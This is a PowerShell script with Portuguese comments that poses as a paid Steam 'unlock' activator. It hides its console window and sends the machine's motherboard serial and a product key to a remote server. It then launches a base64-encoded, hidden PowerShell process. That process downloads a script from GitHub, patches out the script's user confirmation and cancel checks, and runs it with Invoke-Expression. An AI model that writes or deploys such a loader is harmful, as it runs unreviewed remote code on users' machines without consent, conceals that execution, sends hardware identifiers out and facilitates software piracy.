# 1. Oculta a janela inicial (Console)
$showWindow = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$type = Add-Type -MemberDefinition $showWindow -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName Microsoft.VisualBasic, System.Windows.Forms

# Captura HWID e Key
$hwid = (Get-CimInstance Win32_BaseBoard).SerialNumber.Trim()
$key = [Microsoft.VisualBasic.Interaction]::InputBox("Insira sua chave do produto:", "ATIVAR STEAM DESBLOQUEADA", "")

if (-not $key) { exit }

try {
    $url = "https://waedqlfiprmsdkwhjkea.supabase.co/functions/v1/smooth-worker"
    $body = @{ key = $key; hwid = $hwid } | ConvertTo-Json
    $auth = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -UserAgent "Mozilla/5.0"

    if ($auth.status -eq "authorized") {
        
        # Mensagem de sucesso
        [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.", "Sucesso")

        # Comando de fundo (Instalação + Log + Warning + Notepad)
        $bgTask = @"
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        
        # Define o caminho do log
        `$logPath = "`$env:TEMP\SteamAtivador_Log.txt"
        Start-Transcript -Path `$logPath -Force
        
        try {
            Write-Output "Fechando Steam para evitar bloqueio de arquivos (Acesso Negado)..."
            Stop-Process -Name steam -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            
            Write-Output "Baixando script original do GitHub..."
            `$s = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
            
            Write-Output "Aplicando injeções de memória (Bypass de Confirmação)..."
            
            # PATCH 1 (Steamtools): Troca o 'Aperte qualquer tecla' por um pause de 2 segundos.
            # Isso é perfeito pois mantém as 5 retentativas nativas do script fluindo perfeitamente.
            `$s = `$s.Replace('[void][System.Console]::ReadKey(`$true)', 'Start-Sleep -Seconds 2')
            
            # PATCH 2 (Millennium): Zera o timer de 5 segundos
            `$s = `$s -replace '\`$milleniumTimer\s*=\s*5', '`$milleniumTimer = 0'
            
            # PATCH 3 (Millennium): Engana a checagem que verifica se o usuário cancelou a instalação
            `$s = `$s.Replace('[Console]::KeyAvailable', '`$false')

            Write-Output "Executando script autônomo. Lidando com os cenários nativos..."
            # O script agora vai rodar a lógica inteira sozinho. Se tiver a DLL, ele pula. Se não tiver, instala.
            Invoke-Expression `$s

            Write-Output "Baixando aviso final..."
            `$wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
            `$path = "`$env:TEMP\warning.txt"
            (New-Object System.Net.WebClient).DownloadFile(`$wUrl, `$path)
            Start-Process notepad.exe `$path
            Write-Output "Processo finalizado com sucesso!"
            
        } catch {
            Write-Error "ERRO FATAL DURANTE A EXECUÇÃO: `$(`$_.Exception.Message)"
        } finally {
            Stop-Transcript
        }
"@

        # Conversão para Base64 para execução cega e limpa
        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
        
        # Inicia o processo totalmente oculto
        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden
        
        exit

    } else {
        [System.Windows.Forms.MessageBox]::Show("Chave inválida ou já vinculada a outro computador.", "Acesso Negado")
    }
} catch {
    [System.Windows.Forms.MessageBox]::Show("Erro ao validar: Verifique sua chave ou network.`n`nDetalhe: $($_.Exception.Message)", "Erro")
}
